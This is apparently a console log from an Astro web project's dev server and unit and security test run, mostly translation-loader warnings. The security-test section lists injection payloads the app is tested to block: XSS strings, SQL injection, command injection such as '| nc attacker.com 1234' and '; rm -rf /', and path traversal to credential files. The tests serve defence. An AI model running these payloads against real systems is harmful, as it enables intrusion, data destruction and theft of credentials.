[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-04c22692 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-718eb0cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-106f3a7d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8134bd48 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7f707bea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7fd85cae has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7b5fad44 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-6b53607c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4a41bde has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b670fb19 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-037f6f0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-befe1f2c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-cf49f35d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-786371d0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d50fda7c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ffbc9923 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13446ffe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-18e50657 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-15e2a589 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d5304933 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-dbd0a284 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b44634f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-740e7a11 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-728293f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-7890a594 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5c8b291f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-522ed44d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-869af36d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d413dd8 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38b50d5d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-47528800 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-21cf0b9a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f81acf1a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f3ddeab5 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-120d5cac has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2d3ff5a3 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-88ebbd55 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-5fed9429 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1066ee9f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1e5b258b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-374f73f0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c13580f2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-b41de161 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d20767f4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-13017b6d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4fa98cb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-58c974ff has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-acf1541e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-38d95f75 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6a80558 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-39536420 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ec51a1d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-83c379d1 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-198755b4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d1fc560 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2859c74b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c37c2433 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3ad7e563 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-2368a3a2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-0a631f1e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-98339492 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d6cc6d20 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-17ea2aad has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9f544f37 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-ad4b1452 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1beb50d9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-257c96da has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-bf93e13f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-69be50ea has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-11e90d7b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-d26859a0 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-44ebf015 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9d81e3f7 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-10281057 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-c4dadbcc has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-4fc5c4de has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-f7443bbd has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e34a43d2 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-9216e86e has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-e5ab8d0f has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-655d9b87 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-1dd4e1fe has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-8d6eceb9 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:24:39[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-41579eef has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:24:39[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 13 localized entries in Astro Content Layer.
[2m20:24:39[22m [34m[content][39m Synced content
[2m20:24:39[22m [34m[vite][39m Port 4321 is in use, trying another one...
[2m20:24:39[22m [34m[vite][39m Port 4322 is in use, trying another one...

[42m[1m astro [22m[49m [32mv5.18.0[39m [2mready in[22m 24127 [2mms[22m

[2mÔöâ[22m Local    [36mhttp://localhost:4323/[39m
[2mÔöâ[22m Network  [2muse --host to expose[22m

[2m20:24:39[22m [32mwatching for file changes...[39m
[90mstdout[2m | tests/unit/components/Accordion/AccordionItem.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Accordion/AccordionItem.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Accordion/AccordionItem.test.ts [2m([22m[2m15 tests[22m[2m)[22m[33m 52282[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m HTML validity [33m 451[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m Stress: 1000 items [33m 1541[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m Symmetry: toggle open/disabled/type [33m 481[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts[2m > [22m[2mui/Alert[2m > [22m[2mfinal: no memory leaks during batch rendering
[22m[39mÔ£ô Rendered 500 alerts in 431.74ms

[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts[2m > [22m[2mui/Alert[2m > [22m[2mfinal: component ready for production deployment
[22m[39mÔ£ô Alert component is fully production-ready

[90mstdout[2m | tests/security/security.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/security/security.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:25:01[22m [33m[302][39m / [2m43ms[22m
[2m20:25:01[22m [34m[200][39m /fr/ [2m60ms[22m
[90mstdout[2m | tests/security/security.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[2m20:25:03[22m [34m[types][39m Generated [2m63ms[22m
[90mstdout[2m | tests/security/security.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/security/security.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m tests/security/security.test.ts [2m([22m[2m78 tests[22m[2m | [22m[31m1 failed[39m[2m)[22m[33m 29700[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <script>alert(1)</script>[32m 139[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: "<script>alert(1)</script>[32m 119[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: '-alert(1)-'[32m 130[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m blocks XSS payload: <img src=x onerror=alert(1)> [33m 318[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: javascript:alert(1)[32m 117[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: ${alert(1)}[32m 95[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: {{constructor.constructor("alert(1)")()}}[32m 118[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <iframe src="javascript:alert(1)"></iframe>[32m 77[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <body onload=alert(1)>[32m 83[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <input onfocus=alert(1) autofocus>[32m 86[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <select onfocus=alert(1) autofocus>[32m 173[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <textarea onfocus=alert(1) autofocus>[32m 210[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <marquee onstart=alert(1)>[32m 274[2mms[22m[39m
     [32mÔ£ô[39m blocks XSS payload: <div style="background:url(javascript:alert(1))">[32m 235[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: '; DROP TABLE user; --[32m 205[2mms[22m[39m
[31m     [31m├ù[31m blocks SQL injection payload: ' OR '1'='1[39m[32m 229[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: '; DELETE FROM user WHERE '1'='1'; --[32m 219[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: 1'; UPDATE user SET role='admin' WHERE '1'='1[32m 227[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: ' UNION SELECT * FROM pg_authid --[32m 192[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: '; COPY (SELECT '') TO PROGRAM 'id'; --[32m 165[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: admin'--[32m 221[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: ' or 1=1--[32m 215[2mms[22m[39m
     [32mÔ£ô[39m blocks SQL injection payload: ') OR ('1'='1[32m 244[2mms[22m[39m
     [32mÔ£ô[39m blocks command injection: ; cat /etc/passwd[32m 212[2mms[22m[39m
     [32mÔ£ô[39m blocks command injection: && whoami[32m 240[2mms[22m[39m
     [32mÔ£ô[39m blocks command injection: | id[32m 189[2mms[22m[39m
     [32mÔ£ô[39m blocks command injection: `id`[32m 251[2mms[22m[39m
     [32mÔ£ô[39m blocks command injection: $(id)[32m 235[2mms[22m[39m
     [32mÔ£ô[39m blocks command injection: | nc attacker.com 1234[32m 260[2mms[22m[39m
     [32mÔ£ô[39m blocks command injection: ; rm -rf /[32m 197[2mms[22m[39m
     [32mÔ£ô[39m blocks path traversal: ../../../etc/passwd[32m 221[2mms[22m[39m
     [32mÔ£ô[39m blocks path traversal: ..\..\..\windows\system32\config\sam[32m 296[2mms[22m[39m
     [32mÔ£ô[39m blocks path traversal: ....//....//etc/shadow[32m 280[2mms[22m[39m
     [32mÔ£ô[39m blocks path traversal: ..%2f..%2f..%2fetc%2fpasswd[32m 253[2mms[22m[39m
     [32mÔ£ô[39m blocks path traversal: ..%252f..%252fetc%252fpasswd[32m 253[2mms[22m[39m
     [32mÔ£ô[39m blocks null-byte payload: user @example.com[32m 252[2mms[22m[39m
     [32mÔ£ô[39m blocks null-byte payload: test <script>alert(1)</script>[32m 256[2mms[22m[39m
     [32mÔ£ô[39m blocks null-byte payload: admin .php[32m 252[2mms[22m[39m
     [32mÔ£ô[39m allows safe content[32m 265[2mms[22m[39m
     [32mÔ£ô[39m accepts valid input[32m 285[2mms[22m[39m
     [32mÔ£ô[39m rejects XSS in username[32m 236[2mms[22m[39m
     [32mÔ£ô[39m rejects SQLi in name[32m 261[2mms[22m[39m
     [32mÔ£ô[39m rejects command injection in password[32m 266[2mms[22m[39m
     [32mÔ£ô[39m rejects path traversal in username[32m 256[2mms[22m[39m
     [32mÔ£ô[39m rejects null byte in email[32m 292[2mms[22m[39m
     [32mÔ£ô[39m rejects non-string input[32m 244[2mms[22m[39m
     [32mÔ£ô[39m rejects null input[32m 281[2mms[22m[39m
     [32mÔ£ô[39m rejects empty string[32m 276[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: 123[32m 286[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: password[32m 284[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: 12345678[32m 276[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: abc123[32m 205[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: qwerty[32m 147[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: 111111[32m 223[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: admin123[32m 255[2mms[22m[39m
     [32mÔ£ô[39m rejects weak password: aaaaaa[32m 259[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: not-an-email[32m 273[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: @example.com[32m 263[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: user@[32m 266[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: user@@example.com[32m 250[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: user @example.com[32m 279[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: user@example[32m 260[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: [32m 263[2mms[22m[39m
     [32mÔ£ô[39m rejects invalid email: user @example.com[32m 131[2mms[22m[39m
       [32mÔ£ô[39m grants admin role[32m 262[2mms[22m[39m
       [32mÔ£ô[39m grants superadmin role[32m 261[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m denies regular user role [33m 308[2mms[22m[39m
       [32mÔ£ô[39m denies null/undefined user[32m 239[2mms[22m[39m
       [32mÔ£ô[39m denies empty object[32m 247[2mms[22m[39m
       [32mÔ£ô[39m grants superadmin only[32m 249[2mms[22m[39m
       [32mÔ£ô[39m denies admin (not super)[32m 182[2mms[22m[39m
       [32mÔ£ô[39m returns null (pass) for admin user[32m 242[2mms[22m[39m
       [32mÔ£ô[39m returns 403 Response for non-admin[32m 258[2mms[22m[39m
       [32mÔ£ô[39m returns 403 Response for missing user[32m 252[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m rejects XSS in comment content [33m 388[2mms[22m[39m
     [32mÔ£ô[39m rejects javascript: URI in comment content[32m 248[2mms[22m[39m
     [32mÔ£ô[39m accepts safe comment content[32m 266[2mms[22m[39m
     [32mÔ£ô[39m rejects unauthenticated comment[32m 263[2mms[22m[39m
[90mstdout[2m | tests/unit/components/avatar/Avatar.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Alert/Alert.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Alert/Alert.test.ts [2m([22m[2m164 tests[22m[2m)[22m[33m 157309[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m unit: renders a <div> with alert role by default [33m 329[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m axe-core: alert with info status is accessible [33m 1986[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m axe-core: alert with success status is accessible [33m 436[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m axe-core: dismissible alert is accessible [33m 760[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m axe-core: alert with title is accessible [33m 481[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m playwright: renders alert and verifies text content [33m 8326[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m playwright: close button removes alert when clicked [33m 7913[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m playwright: icon is rendered correctly [33m 8972[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m playwright: data-status attribute is correctly set [33m 2740[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m pa11y: accessible default alert [33m 2403[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m lighthouse: default alert [33m 10333[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m stress: renders 1000 alerts without performance degradation [33m 1921[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m interactive: close button has proper aria-label [33m 648[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m interactive: alert role is present and correct [33m 505[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m performance: renders 1000 alerts sequentially [33m 1497[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m integration-pw: alert with all variants [33m 21130[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m integration-pw: dismissible alert removes on close [33m 10249[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m final: accessibility audit passes [33m 559[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m final: no memory leaks during batch rendering [33m 504[2mms[22m[39m
[90mstdout[2m | tests/integration/multi-tenant-isolation.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:25:41[22m [34m[types][39m Generated [2m46ms[22m
[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s
[2m20:25:44[22m [33m[302][39m / [2m4802ms[22m
[2m20:25:44[22m [33m[302][39m / [2m124ms[22m
[2m20:25:45[22m [34m[types][39m Generated [2m15ms[22m
[2m20:25:48[22m [34m[astro-icon][39m Loaded icons from src/icons, circle-flags, mdi, openmoji
[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  write to custom object with { processEnv: myObject }
[2m20:25:51[22m [34m[content][39m Syncing content
[2m20:25:51[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:25:51[22m [34m[drizzle-translation-loader][39m ­ƒöì START: Drizzle Translation Loader
[2m20:25:52[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 39 parent entities.
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-ef3f9808 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-3d0f20d6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-13267693 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-f0ff1376 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-9bb2241b has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-153bc25a has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-829b3c9d has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-75b7467c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-4d7685e6 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1974855c has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-aec14411 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-1aa84786 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity post-cb8cc996 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[2m20:25:52[22m [34m[drizzle-translation-loader][39m Ô£à FINISHED: Created 60 localized entries in Astro Content Layer.
[2m20:25:52[22m [34m[drizzle-translation-loader][39m ­ƒôè Database returned 164 parent entities.
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-3cdaa9fb has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
[33m[1m20:25:52[22m [WARN] [drizzle-translation-loader][39m ÔÜá´©Å Entity svc-fd8e4bc4 has an EMPTY translations array. Check 'blog_translations' table (post_id matching?).
